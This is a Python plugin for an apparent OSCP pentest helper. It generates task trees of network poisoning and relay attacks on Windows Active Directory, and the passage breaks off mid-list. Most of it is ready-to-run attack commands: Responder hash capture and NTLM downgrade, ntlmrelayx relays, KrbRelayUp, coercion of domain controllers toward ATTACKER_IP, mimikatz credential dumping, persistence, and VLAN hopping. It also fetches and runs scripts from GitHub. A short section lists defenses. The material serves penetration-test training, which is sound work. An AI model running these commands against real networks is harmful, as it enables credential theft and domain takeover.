"""
Network Protocol Poisoning service plugin

Generates tasks for network-level attacks including:
- LLMNR/NBT-NS/mDNS spoofing and poisoning
- WPAD auto-discovery hijacking
- NTLM relay attacks (SMB/LDAP/HTTP)
- Kerberos relay attacks
- WSUS HTTP NTLM relay
- DHCPv6 and DHCP poisoning
- VLAN hopping (DTP, double-tagging, voice VLAN hijacking)
- Routing protocol attacks (EIGRP, GLBP, HSRP)
- SSDP/UPnP device spoofing

OSCP CRITICAL: These attacks are exam-critical for initial foothold
and lateral movement in Active Directory environments.

Extracted from HackTricks:
- pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
- pentesting-network/eigrp-attacks.md
- pentesting-network/glbp-and-hsrp-attacks.md
- pentesting-network/lateral-vlan-segmentation-bypass.md
- pentesting-network/spoofing-ssdp-and-upnp-devices.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class NetworkPoisoningPlugin(ServicePlugin):
    """Network protocol poisoning and relay attack plugin"""

    @property
    def name(self) -> str:
        return "network-poisoning"

    @property
    def default_ports(self) -> List[int]:
        # Trigger on common SMB/LDAP ports or general network scan
        return [445, 389, 137, 138, 139, 636]

    @property
    def service_names(self) -> List[str]:
        return ['smb', 'ldap', 'netbios-ssn', 'microsoft-ds', 'ldaps']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """
        Detect when network poisoning attacks are applicable

        Triggers when:
        - SMB (445, 139) detected (for relay attacks)
        - LDAP (389, 636) detected (for relay targets)
        - NetBIOS (137, 138) detected (NBT-NS poisoning)
        - Any Windows network service (indicates AD environment)
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Check service names
        if any(svc in service for svc in self.service_names):
            return True

        # Check common Windows network ports
        if port in self.default_ports:
            return True

        # Check for Windows indicators
        if any(indicator in product for indicator in ['windows', 'active directory', 'samba']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate network poisoning attack task tree"""
        service = service_info.get('service', '').lower()
        product = service_info.get('product', 'Windows Network')

        tasks = {
            'id': f'net-poison-{port}',
            'name': f'Network Poisoning Attacks ({product})',
            'type': 'parent',
            'children': []
        }

        # ========== PHASE 1: RESPONDER ATTACKS ==========
        responder_tasks = {
            'id': f'responder-attacks-{port}',
            'name': 'Responder: LLMNR/NBT-NS/mDNS Poisoning',
            'type': 'parent',
            'children': []
        }

        # Task 1: Basic Responder (passive capture)
        responder_tasks['children'].append({
            'id': f'responder-basic-{port}',
            'name': 'Responder: Passive Hash Capture',
            'type': 'command',
            'metadata': {
                'command': 'sudo responder -I eth0 -v',
                'description': 'Passively poison LLMNR/NBT-NS/mDNS and capture NTLMv2 hashes',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'NOISY', 'ENUM'],
                'flag_explanations': {
                    '-I eth0': 'Network interface to listen on (change eth0 to your interface)',
                    '-v': 'Verbose output showing all captured authentication attempts',
                    'sudo': 'Required for raw packet capture and service binding'
                },
                'success_indicators': [
                    '[+] Listening for events...',
                    '[SMB] NTLMv2-SSP Hash captured',
                    '[HTTP] NTLMv2 Hash captured',
                    'Hashes saved to /usr/share/responder/logs/'
                ],
                'failure_indicators': [
                    'Error: Interface not found (check interface name with ip a)',
                    'Permission denied (requires sudo)',
                    'No authentication events after 10+ minutes (network may not use LLMNR/NBT-NS)'
                ],
                'next_steps': [
                    'Monitor output for captured NTLMv2 hashes (format: username::domain:challenge:response)',
                    'Check /usr/share/responder/logs/ for saved hashes',
                    'Crack captured hashes with hashcat -m 5600 hashes.txt wordlist.txt',
                    'If capturing hashes, proceed to NTLM relay attacks',
                    'Wait 15-30 minutes in real network for authentication events'
                ],
                'alternatives': [
                    'Manual: Configure /etc/responder/Responder.conf before running',
                    'Inveigh (Windows): Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y',
                    'InveighZero (C# binary): Inveigh.exe',
                    'Manual listening: tcpdump -i eth0 udp port 5355 (LLMNR) or 137 (NBT-NS)'
                ],
                'notes': 'Config: /etc/responder/Responder.conf. Logs: /usr/share/responder/logs/. Responder listens on: SMB, HTTP, LDAP, FTP, SQL, and poisons LLMNR (UDP 5355), NBT-NS (UDP 137), mDNS (UDP 5353). This is NOISY - generates significant network traffic and log entries.'
            }
        })

        # Task 2: Aggressive Responder with WPAD
        responder_tasks['children'].append({
            'id': f'responder-wpad-{port}',
            'name': 'Responder: WPAD + Aggressive Probing',
            'type': 'command',
            'metadata': {
                'command': 'sudo responder -I eth0 -wpad -P -r -v',
                'description': 'Aggressive WPAD hijacking with forced authentication probing',
                'tags': ['OSCP:HIGH', 'AUTOMATED', 'NOISY', 'EXPLOIT'],
                'flag_explanations': {
                    '-I eth0': 'Network interface to listen on',
                    '-wpad': 'Enable WPAD (Web Proxy Auto-Discovery) rogue server',
                    '-P': 'Force NTLM/Basic authentication on HTTP proxy',
                    '-r': 'Force NTLM authentication on previously valid SMB clients',
                    '-v': 'Verbose output'
                },
                'success_indicators': [
                    '[+] WPAD Proxy Server Started',
                    '[Proxy] Sending WPAD file to client',
                    '[HTTP] NTLMv2 Hash captured via WPAD',
                    'Multiple authentication attempts from same client (forced re-auth working)'
                ],
                'failure_indicators': [
                    'No WPAD requests after 10 minutes (network may not use auto-proxy)',
                    'Clients ignoring WPAD responses (DNS/DHCP WPAD taking precedence)',
                    'All authentication attempts timing out'
                ],
                'next_steps': [
                    'If WPAD effective, capture authentication from browsers and applications',
                    'Check for plaintext credentials (some apps send Basic auth)',
                    'Crack captured NTLMv2 hashes',
                    'Combine with NTLM relay if SMB signing disabled'
                ],
                'alternatives': [
                    'Manual WPAD: responder -I eth0 --wpad (without -P -r for stealth)',
                    'mitm6 (IPv6 DHCPv6 DNS): sudo mitm6 -i eth0 --no-ra',
                    'Bettercap WPAD: bettercap -iface eth0 --proxy'
                ],
                'notes': 'VERY NOISY - generates many failed auth attempts. May cause disruption. WPAD discovery order: DHCP → DNS → LLMNR/NBT-NS (Responder targets last resort). Modern Windows has WPAD disabled by default. Test in lab first.'
            }
        })

        # Task 3: Downgrade to NTLMv1 (easier cracking)
        responder_tasks['children'].append({
            'id': f'responder-ntlmv1-{port}',
            'name': 'Responder: Force NTLMv1 Downgrade',
            'type': 'command',
            'metadata': {
                'command': 'sudo responder -I eth0 --lm --disable-ess -v',
                'description': 'Force NTLMv1 authentication for easier cracking (rainbow tables)',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'NOISY', 'EXPLOIT'],
                'flag_explanations': {
                    '--lm': 'Force LM hashing (extremely weak, cracks in seconds)',
                    '--disable-ess': 'Disable Extended Session Security (allows NTLMv1)',
                    '-v': 'Verbose output'
                },
                'success_indicators': [
                    '[SMB] NTLMv1 Hash captured (easier to crack)',
                    '[HTTP] NTLMv1-SSP Hash captured',
                    'Hash format: username:::lm-hash:ntlm-hash'
                ],
                'failure_indicators': [
                    'Only NTLMv2 captured (client refused downgrade)',
                    'No downgrade possible (NTLMv1 disabled domain-wide)',
                    'Network policy enforcing NTLMv2 minimum'
                ],
                'next_steps': [
                    'Crack NTLMv1: hashcat -m 5500 ntlmv1.txt wordlist.txt (or rainbow tables)',
                    'LM hashes crack in seconds with rainbow tables',
                    'If NTLMv1 disabled, fall back to NTLMv2 cracking'
                ],
                'alternatives': [
                    'Check domain policy: crackmapexec smb {target} -u user -p pass --ntlm-downgrade',
                    'Manual: Edit /etc/responder/Responder.conf and set LM=On, NTLM=NTLMv1'
                ],
                'notes': 'NTLMv1 deprecated since Windows Vista. Unlikely in modern networks unless legacy systems present. If successful, hashes crack MUCH faster (minutes vs days for NTLMv2).'
            }
        })

        # Task 4: DHCP poisoning
        responder_tasks['children'].append({
            'id': f'responder-dhcp-{port}',
            'name': 'Responder: DHCP Poisoning (Stealthy)',
            'type': 'command',
            'metadata': {
                'command': 'sudo responder -I eth0 -Pdv',
                'description': 'Poison DHCP responses to become default gateway (permanent MitM)',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'STEALTH', 'EXPLOIT'],
                'flag_explanations': {
                    '-P': 'Force NTLM authentication on wpad',
                    '-d': 'Enable DHCP rogue server',
                    '-v': 'Verbose output'
                },
                'success_indicators': [
                    '[DHCP] Rogue DHCP server started',
                    '[DHCP] Sent DHCP offer to client',
                    '[DHCP] Client accepted our offer as gateway',
                    'Client traffic routing through attacker machine'
                ],
                'failure_indicators': [
                    'Legitimate DHCP server responding faster (race condition)',
                    'DHCP snooping enabled on switch (enterprise defense)',
                    'Clients not renewing DHCP leases'
                ],
                'next_steps': [
                    'Enable IPv4 forwarding: sudo sysctl -w net.ipv4.ip_forward=1',
                    'Set up iptables NAT: sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE',
                    'Capture all traffic with tcpdump or Wireshark',
                    'Run NTLM relay attacks on captured authentication'
                ],
                'alternatives': [
                    'Bettercap DHCP: bettercap -iface eth0 --dhcp',
                    'Manual: Configure ISC DHCP server with malicious settings',
                    'Yersinia: GUI-based DHCP attack tool'
                ],
                'notes': 'REQUIRES PRECISE NETWORK KNOWLEDGE. Risk: Network disruption if misconfigured. Advantage: More persistent than ARP poisoning. Defense: DHCP snooping on enterprise switches.'
            }
        })

        tasks['children'].append(responder_tasks)

        # ========== PHASE 2: NTLM RELAY ATTACKS ==========
        ntlm_relay_tasks = {
            'id': f'ntlm-relay-{port}',
            'name': 'NTLM Relay Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 5: Check SMB signing status (prerequisite for relay)
        ntlm_relay_tasks['children'].append({
            'id': f'check-smb-signing-{port}',
            'name': 'Check SMB Signing Status (Relay Prerequisite)',
            'type': 'command',
            'metadata': {
                'command': f'nmap --script smb-security-mode,smb2-security-mode -p445 {target}',
                'description': 'Check if SMB signing is disabled (required for NTLM relay)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    '--script smb-security-mode': 'Check SMB signing configuration',
                    '--script smb2-security-mode': 'Check SMBv2/v3 signing configuration',
                    '-p445': 'Target SMB port'
                },
                'success_indicators': [
                    'Message signing enabled but not required (RELAY POSSIBLE)',
                    'Message signing disabled (RELAY POSSIBLE)',
                    'Account that was used for authentication: guest (anonymous access)'
                ],
                'failure_indicators': [
                    'Message signing enabled and required (RELAY BLOCKED)',
                    'Port 445 filtered or closed',
                    'Host unreachable'
                ],
                'next_steps': [
                    'If signing disabled/not required: Proceed with NTLM relay',
                    'If signing required: Try relay to LDAP, HTTP, or other protocols',
                    'Document all hosts with signing disabled for relay target list'
                ],
                'alternatives': [
                    f'crackmapexec smb {target} --gen-relay-list targets.txt',
                    f'Manual: smbclient -L //{target} -N (if succeeds without error, signing likely disabled)',
                    'NetExec: netexec smb {target} --signing'
                ],
                'notes': 'SMB signing disabled = CRITICAL vulnerability in AD environments. Allows relay attacks to gain system shells. Check entire subnet: crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt'
            }
        })

        # Task 6: NTLM relay to SMB (system shell)
        ntlm_relay_tasks['children'].append({
            'id': f'ntlmrelayx-smb-{port}',
            'name': 'ntlmrelayx: Relay to SMB (System Shell)',
            'type': 'command',
            'metadata': {
                'command': f'sudo ntlmrelayx.py -tf targets.txt -smb2support -socks --keep-relaying',
                'description': 'Relay captured NTLM auth to SMB targets for system shell',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTOMATED', 'RCE'],
                'flag_explanations': {
                    '-tf targets.txt': 'File with relay targets (hosts with SMB signing disabled)',
                    '-smb2support': 'Enable SMBv2/v3 support',
                    '-socks': 'Create SOCKS proxy for relayed sessions (allows tool access)',
                    '--keep-relaying': 'Relay multiple authentications (don\'t exit after first)'
                },
                'success_indicators': [
                    '[*] Authenticating against smb://TARGET as DOMAIN\\USER SUCCEED',
                    '[*] SOCKS: Adding DOMAIN\\USER@TARGET(445) to active SOCKS connection',
                    '[*] Executed command via service (SUCCESS)',
                    'SAM hashes dumped'
                ],
                'failure_indicators': [
                    'STATUS_ACCESS_DENIED (user not local admin on target)',
                    'SMB signing required (relay blocked)',
                    'Connection timeout (target unreachable)',
                    'No authentication captured (Responder not running or no activity)'
                ],
                'next_steps': [
                    'Use SOCKS proxy: proxychains smbclient -L //TARGET -U DOMAIN/USER',
                    'Use secretsdump via SOCKS: proxychains secretsdump.py DOMAIN/USER@TARGET',
                    'Interactive shell: proxychains psexec.py DOMAIN/USER@TARGET',
                    'Check ntlmrelayx output for dumped SAM/LSA secrets',
                    'Add compromised credentials to credential database'
                ],
                'alternatives': [
                    'Metasploit: auxiliary/server/capture/smb + exploit/windows/smb/smb_relay',
                    'MultiRelay.py: python MultiRelay.py -t TARGET -u ALL -c whoami',
                    'smbrelayx (legacy): smbrelayx.py -h TARGET -c "whoami"'
                ],
                'notes': 'REQUIREMENTS: (1) User must be local admin on relay target, (2) SMB signing disabled. RUN IN SEPARATE TERMINAL alongside Responder. Common workflow: Terminal 1: Responder, Terminal 2: ntlmrelayx. Captured auth from Responder automatically relayed by ntlmrelayx. SOCKS proxy on 127.0.0.1:1080 by default.'
            }
        })

        # Task 7: NTLM relay to LDAP (RBCD/Shadow Credentials)
        ntlm_relay_tasks['children'].append({
            'id': f'ntlmrelayx-ldap-{port}',
            'name': 'ntlmrelayx: Relay to LDAP (RBCD/Shadow Creds)',
            'type': 'command',
            'metadata': {
                'command': f'sudo ntlmrelayx.py -t ldap://{target} --escalate-user lowprivuser --delegate-access',
                'description': 'Relay machine account to LDAP for Resource-Based Constrained Delegation',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                'flag_explanations': {
                    '-t ldap://TARGET': 'Relay target (domain controller LDAP)',
                    '--escalate-user lowprivuser': 'Add user to privileged group',
                    '--delegate-access': 'Configure RBCD (Resource-Based Constrained Delegation)'
                },
                'success_indicators': [
                    '[*] Authenticating against ldap://DC as MACHINE$ SUCCEED',
                    '[*] Delegation rights modified successfully',
                    '[*] Created new machine account: EVILCOMPUTER$',
                    '[*] Set delegation: EVILCOMPUTER$ -> TARGET$'
                ],
                'failure_indicators': [
                    'LDAP signing required (relay blocked)',
                    'Insufficient privileges (need machine account auth)',
                    'MachineAccountQuota=0 (cannot create machine accounts)'
                ],
                'next_steps': [
                    'Request service ticket: getST.py -spn cifs/TARGET DOMAIN/EVILCOMPUTER$ -impersonate Administrator',
                    'Use ticket: export KRB5CCNAME=Administrator.ccache',
                    'Access target: psexec.py -k -no-pass DOMAIN/Administrator@TARGET',
                    'Alternatively: use shadow credentials if --shadow-credentials used'
                ],
                'alternatives': [
                    'Shadow Credentials: ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target TARGET$',
                    'Manual RBCD: Use PowerView/AD module to set msDS-AllowedToActOnBehalfOfOtherIdentity',
                    'KrbRelayUp: All-in-one RBCD via Kerberos relay'
                ],
                'notes': 'REQUIRES MACHINE ACCOUNT AUTH (capture with Responder + coercion, or via compromised workstation). RBCD allows impersonation of ANY user to target. Default MachineAccountQuota=10 (can create 10 machine accounts). Shadow Credentials requires AD CS or PKINIT.'
            }
        })

        # Task 8: WSUS HTTP relay
        ntlm_relay_tasks['children'].append({
            'id': f'wsus-relay-{port}',
            'name': 'WSUS HTTP NTLM Relay (Port 8530)',
            'type': 'command',
            'metadata': {
                'command': f'sudo ntlmrelayx.py -t ldap://{target} --http-port 8530 -smb2support --escalate-user lowprivuser',
                'description': 'Relay WSUS client authentication (HTTP 8530) to LDAP/SMB',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'STEALTH'],
                'flag_explanations': {
                    '-t ldap://TARGET': 'Relay target (usually domain controller)',
                    '--http-port 8530': 'Listen on WSUS HTTP port instead of default 80',
                    '-smb2support': 'Enable SMBv2 support',
                    '--escalate-user': 'Add user to privileged group'
                },
                'success_indicators': [
                    '[*] HTTPD: Authenticating against ldap://DC as MACHINE$ SUCCEED',
                    '[*] HTTPD: Received connection from WSUS client',
                    '[*] Escalation successful for user',
                    'Machine account authentication captured'
                ],
                'failure_indicators': [
                    'No WSUS clients checking in (wrong network or WSUS HTTPS)',
                    'LDAP signing required (try -t smb://TARGET)',
                    'WSUS server configured for HTTPS 8531 (relay not possible)'
                ],
                'next_steps': [
                    'Identify WSUS clients: nmap -sSVC -p 8530,8531 -iL targets.txt',
                    'Enumerate GPO WSUS settings: Get WSUS server from SYSVOL',
                    'Position for MitM: arpspoof -i eth0 -t CLIENT WSUS_SERVER',
                    'Trigger check-in from client: wuauclt.exe /detectnow',
                    'Use escalated privileges or relayed sessions'
                ],
                'alternatives': [
                    'Relay to AD CS (ESC8): ntlmrelayx.py --http-port 8530 -t http://CA/certsrv/certfnsh.asp --adcs',
                    'Relay to SMB: ntlmrelayx.py --http-port 8530 -t smb://TARGET',
                    'Passive monitoring: wsusniff.py -i eth0 (observe WSUS clients)'
                ],
                'notes': 'WSUS HTTP (8530) still common despite deprecation. Requires L2 MitM (ARP/DNS poisoning) to redirect WSUS traffic. Machine accounts authenticate periodically. Check DetectionFrequency in GPO for timing. HTTPS (8531) not vulnerable without TLS break.'
            }
        })

        tasks['children'].append(ntlm_relay_tasks)

        # ========== PHASE 3: KERBEROS RELAY ==========
        kerberos_relay_tasks = {
            'id': f'krb-relay-{port}',
            'name': 'Kerberos Relay Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 9: Kerberos relay recon
        kerberos_relay_tasks['children'].append({
            'id': f'krb-relay-recon-{port}',
            'name': 'Kerberos Relay: Recon Target SPNs',
            'type': 'command',
            'metadata': {
                'command': f'crackmapexec ldap {target} -u user -p pass -M get-spn',
                'description': 'Find servers where HTTP, LDAP, CIFS share same machine account',
                'tags': ['OSCP:MEDIUM', 'RECON', 'ENUM'],
                'flag_explanations': {
                    'ldap': 'Use LDAP protocol module',
                    '-u user -p pass': 'Valid domain credentials',
                    '-M get-spn': 'Module to enumerate Service Principal Names'
                },
                'success_indicators': [
                    'Multiple SPNs on same account: HTTP/host, CIFS/host, LDAP/host',
                    'Server servicePrincipalName list retrieved',
                    'Found accounts with HTTP + LDAP SPNs'
                ],
                'failure_indicators': [
                    'No credentials available',
                    'LDAP connection refused',
                    'Insufficient privileges to query LDAP'
                ],
                'next_steps': [
                    'Document servers with multiple SPNs on same account',
                    'Prioritize: HTTP/LDAP/CIFS on domain controllers (high value)',
                    'Check if LDAP/SMB signing disabled on targets',
                    'Proceed with KrbRelayUp if suitable target found'
                ],
                'alternatives': [
                    'PowerShell: Get-ADComputer -Filter * -Properties servicePrincipalName | Where-Object {$_.servicePrincipalName -match "(HTTP|LDAP|CIFS)"}',
                    'ldapsearch: ldapsearch -x -h DC -b "DC=domain,DC=com" servicePrincipalName=*',
                    'BloodHound: Query "Find computers with multiple SPNs"'
                ],
                'notes': 'Kerberos relay works when source and target SPNs share same machine account key. Example: Capture CIFS/DC01 ticket → relay to LDAP/DC01 (same key decrypts). Tickets encrypted with machine NT hash, not SPN string.'
            }
        })

        # Task 10: KrbRelayUp (local SYSTEM)
        kerberos_relay_tasks['children'].append({
            'id': f'krb-relay-up-{port}',
            'name': 'KrbRelayUp: Local Privilege Escalation',
            'type': 'command',
            'metadata': {
                'command': '.\\KrbRelayUp.exe relay --spn ldap/DC01.domain.local --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8',
                'description': 'One-click Kerberos relay to LDAP for local SYSTEM via RBCD',
                'tags': ['OSCP:HIGH', 'PRIVESC', 'EXPLOIT'],
                'flag_explanations': {
                    'relay': 'Relay mode (capture and relay Kerberos auth)',
                    '--spn ldap/DC01': 'Target SPN on domain controller',
                    '--method rbcd': 'Use Resource-Based Constrained Delegation',
                    '--clsid': 'DCOM CLSID to trigger local authentication'
                },
                'success_indicators': [
                    '[+] Kerberos relay successful',
                    '[+] RBCD configured on target',
                    '[+] Service ticket obtained',
                    '[+] NT AUTHORITY\\SYSTEM shell spawned'
                ],
                'failure_indicators': [
                    'LDAP signing enabled (relay blocked)',
                    'Insufficient privileges',
                    'MachineAccountQuota=0',
                    'Clock skew > 5 minutes (KRB_AP_ERR_SKEW)'
                ],
                'next_steps': [
                    'Verify SYSTEM shell: whoami (should show NT AUTHORITY\\SYSTEM)',
                    'Dump credentials: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
                    'Dump SAM/LSA: reg save HKLM\\SAM sam.hiv',
                    'Establish persistence before cleanup'
                ],
                'alternatives': [
                    'Manual: New-MachineAccount + KrbRelay.exe + Rubeus S4U + SCMUACBypass',
                    'RemotePotato0: Similar local SYSTEM escalation via DCOM',
                    'PrintSpoofer: Local priv esc if SeImpersonatePrivilege'
                ],
                'notes': 'KrbRelayUp = KrbRelay + LDAP + RBCD + Rubeus + SCM bypass in one binary. Requires local admin for driver load. Works even if NTLM relay blocked. Must sync time with DC (w32tm /resync). Coerces local machine to auth to itself via DCOM.'
            }
        })

        # Task 11: Kerberos relay with coercion
        kerberos_relay_tasks['children'].append({
            'id': f'krb-coerce-relay-{port}',
            'name': 'Kerberos Relay: Coercion + Relay',
            'type': 'manual',
            'metadata': {
                'description': 'Coerce DC authentication and relay Kerberos ticket to LDAP',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                'notes': '''MANUAL WORKFLOW:
1. Start KrbRelay listener:
   KrbRelay.exe -spn ldap/DC01.domain.local -method rbcd

2. Coerce DC authentication (separate terminal):
   dfscoerce.exe --target \\\\DC01.domain.local --listener ATTACKER_IP
   OR: PetitPotam.exe ATTACKER_IP DC01.domain.local
   OR: Coercer.py -l ATTACKER_IP -t DC01.domain.local

3. KrbRelay captures CIFS/DC01 ticket and relays to ldap://DC01

4. RBCD configured automatically by KrbRelay

5. Impersonate admin:
   Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt

6. Access DC:
   PsExec.exe -accepteula \\\\DC01 cmd

COERCION METHODS:
- DFSCoerce: DCERPC MS-DFSNM (most reliable)
- PetitPotam: EFSRPC (often patched KB5005413)
- PrinterBug: MS-RPRN (requires spooler service)

REQUIREMENTS:
- Same account for source/target SPNs (CIFS + LDAP on DC01)
- No channel protection (LDAP/SMB signing off)
- Can coerce auth (domain user sufficient for most methods)
- Race condition: relay before real packet hits DC''',
                'alternatives': [
                    'All-in-one: KrbRelayUp (no coercion needed, uses local DCOM)',
                    'AD CS relay: Coerce to HTTP/CA for certificate (ESC8)',
                    'Shadow Credentials: Write msDS-KeyCredentialLink instead of RBCD'
                ]
            }
        })

        tasks['children'].append(kerberos_relay_tasks)

        # ========== PHASE 4: COERCION TECHNIQUES ==========
        coercion_tasks = {
            'id': f'coercion-{port}',
            'name': 'Authentication Coercion Techniques',
            'type': 'parent',
            'children': []
        }

        # Task 12: PetitPotam
        coercion_tasks['children'].append({
            'id': f'petitpotam-{port}',
            'name': 'PetitPotam: EFS RPC Coercion',
            'type': 'command',
            'metadata': {
                'command': f'python3 PetitPotam.py -u user -p pass -d domain ATTACKER_IP {target}',
                'description': 'Coerce NTLM/Kerberos authentication via EFS RPC',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'COERCION'],
                'flag_explanations': {
                    '-u user -p pass': 'Domain credentials (empty for unauthenticated)',
                    '-d domain': 'Domain name',
                    'ATTACKER_IP': 'Where to send coerced authentication',
                    target: 'Victim to coerce'
                },
                'success_indicators': [
                    '[+] Attack worked!',
                    '[+] Authentication received on relay listener',
                    'Machine account authentication captured'
                ],
                'failure_indicators': [
                    'Access denied (patched KB5005413)',
                    'RPC server unavailable',
                    'No authentication received on relay listener'
                ],
                'next_steps': [
                    'Capture auth with ntlmrelayx or KrbRelay',
                    'If unauthenticated variant fails, try authenticated',
                    'Try alternative coercion methods (DFSCoerce, PrinterBug)'
                ],
                'alternatives': [
                    'DFSCoerce: dfscoerce.exe -d domain -u user -p pass ATTACKER_IP TARGET',
                    'PrinterBug: python3 printerbug.py domain/user:pass@TARGET ATTACKER_IP',
                    'Coercer (all-in-one): Coercer.py -l ATTACKER_IP -t TARGET --always-continue'
                ],
                'notes': 'PetitPotam often patched (KB5005413). Try unauthenticated first: PetitPotam.py ATTACKER_IP TARGET. Coerces machine account auth (high privilege). Combine with NTLM/Kerberos relay. GitHub: topotam/PetitPotam'
            }
        })

        tasks['children'].append(coercion_tasks)

        # ========== PHASE 5: MITIGATION CHECKS ==========
        mitigation_tasks = {
            'id': f'mitigation-checks-{port}',
            'name': 'Check Network Poisoning Defenses',
            'type': 'parent',
            'children': []
        }

        # Task 13: Check defenses
        mitigation_tasks['children'].append({
            'id': f'check-defenses-{port}',
            'name': 'Enumerate Network Security Posture',
            'type': 'manual',
            'metadata': {
                'description': 'Assess network defenses against poisoning attacks',
                'tags': ['OSCP:MEDIUM', 'RECON', 'MANUAL'],
                'notes': '''DEFENSE CHECKLIST:

SMB/LDAP Signing:
- Check: crackmapexec smb 192.168.1.0/24 --gen-relay-list relayable.txt
- Look for: "signing: False" or "not required"
- Impact: If disabled → NTLM relay possible

LLMNR/NBT-NS:
- Check: Responder passive mode for 30 min
- Look for: Name resolution requests
- Impact: If active → Credential capture possible

MachineAccountQuota:
- Check: crackmapexec ldap DC -u user -p pass -M maq
- Look for: Value > 0
- Impact: If > 0 → Can create fake machine accounts for RBCD

WSUS Configuration:
- Check: nmap -p 8530,8531 -sV DC
- Check GPO: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate
- Look for: HTTP (8530) vs HTTPS (8531)
- Impact: HTTP → Relay possible

EPA (Extended Protection):
- Check LDAP: ldapsearch without EPA support
- Check HTTP: netsh http show servicestate
- Impact: If disabled → Channel binding attacks possible

DHCP Snooping:
- Check: Network switch configuration (requires access)
- Impact: If disabled → DHCP poisoning possible

RECOMMENDATIONS:
✓ Enable SMB signing (require)
✓ Disable LLMNR/NBT-NS via GPO
✓ Set MachineAccountQuota=0
✓ Use WSUS HTTPS (8531) only
✓ Enable EPA on LDAP/HTTP
✓ Deploy DHCP snooping on switches
✓ Monitor Event 4649 (Kerberos replay)''',
                'alternatives': [
                    'BloodHound: Import data and check "Find computers without SMB signing"',
                    'PingCastle: Automated AD security assessment',
                    'Purple Knight: Automated defense check'
                ]
            }
        })

        tasks['children'].append(mitigation_tasks)

        # ========== PHASE 6: VLAN HOPPING ATTACKS ==========
        vlan_hopping_tasks = {
            'id': f'vlan-hopping-{port}',
            'name': 'VLAN Hopping Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 14: DTP switch spoofing
        vlan_hopping_tasks['children'].append({
            'id': f'dtp-spoof-{port}',
            'name': 'DTP Switch Spoofing (Auto-Trunk Negotiation)',
            'type': 'command',
            'metadata': {
                'command': 'sudo yersinia -G',
                'description': 'Negotiate trunk port via DTP to access all VLANs',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'VLAN', 'LAYER2'],
                'flag_explanations': {
                    'yersinia': 'Layer 2 attack framework for network protocols',
                    '-G': 'Launch GUI mode (Launch attack → DTP → enabling trunking)'
                },
                'success_indicators': [
                    'Port transitioned to trunk mode',
                    'DTP Desirable/Auto frames sent',
                    'Switch responds with trunk negotiation',
                    'Interface shows mode: trunk'
                ],
                'failure_indicators': [
                    'DTP disabled on switch (switchport nonegotiate)',
                    'Port hardened to access mode',
                    'No DTP frames received',
                    'Authentication required (802.1X)'
                ],
                'next_steps': [
                    'Create 802.1Q sub-interfaces: sudo ip link add link eth0 name eth0.10 type vlan id 10',
                    'Enable sub-interface: sudo ip link set eth0.10 up',
                    'Request DHCP on VLAN: sudo dhclient -v eth0.10',
                    'Or set static IP: sudo ip addr add 10.10.10.50/24 dev eth0.10',
                    'Enumerate all VLANs by creating interfaces for each discovered VLAN ID'
                ],
                'alternatives': [
                    'CLI version: sudo yersinia dtp -attack 1 -interface eth0',
                    'Python PoC: git clone https://github.com/fleetcaptain/dtp-spoof.git && sudo python3 dtp-spoof.py -i eth0 --desirable',
                    'Scapy script: Send DTP desirable frames manually',
                    'dtpscan.py: Passive DTP fingerprinting (wget https://gist.githubusercontent.com/mgeeky/3f678d385984ba0377299a844fb793fa/raw/dtpscan.py)'
                ],
                'notes': 'DTP enabled by default on Cisco switches. Check: show interface Gi0/1 switchport. Defense: switchport mode access + switchport nonegotiate. Once trunk established, access ALL VLANs. VLAN 1 often native (untagged).'
            }
        })

        # Task 15: Double-tagging (native VLAN abuse)
        vlan_hopping_tasks['children'].append({
            'id': f'double-tag-{port}',
            'name': 'VLAN Double-Tagging Attack',
            'type': 'command',
            'metadata': {
                'command': 'python3 /path/to/DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim 10.10.20.24 --attacker 10.10.1.54',
                'description': 'Hop from native VLAN to target VLAN via double 802.1Q tags',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'VLAN', 'LAYER2'],
                'flag_explanations': {
                    '--interface eth0': 'Network interface on native VLAN',
                    '--nativevlan 1': 'Native (untagged) VLAN ID (often VLAN 1)',
                    '--targetvlan 20': 'Target VLAN to hop into',
                    '--victim': 'Target IP address in remote VLAN',
                    '--attacker': 'Attacker IP in native VLAN'
                },
                'success_indicators': [
                    'Crafted double-tagged frame sent',
                    'Response received from target VLAN',
                    'Switch forwards inner-tagged frame to target VLAN',
                    'Ping successful to victim IP'
                ],
                'failure_indicators': [
                    'Not on native VLAN (attack requires untagged VLAN)',
                    'Native VLAN tagged on trunk (vlan dot1q tag native)',
                    'No response from victim',
                    'Switch drops double-tagged frames'
                ],
                'next_steps': [
                    'Identify native VLAN: Look for untagged traffic in tcpdump',
                    'Enumerate target VLANs: Try VLAN IDs 2-100',
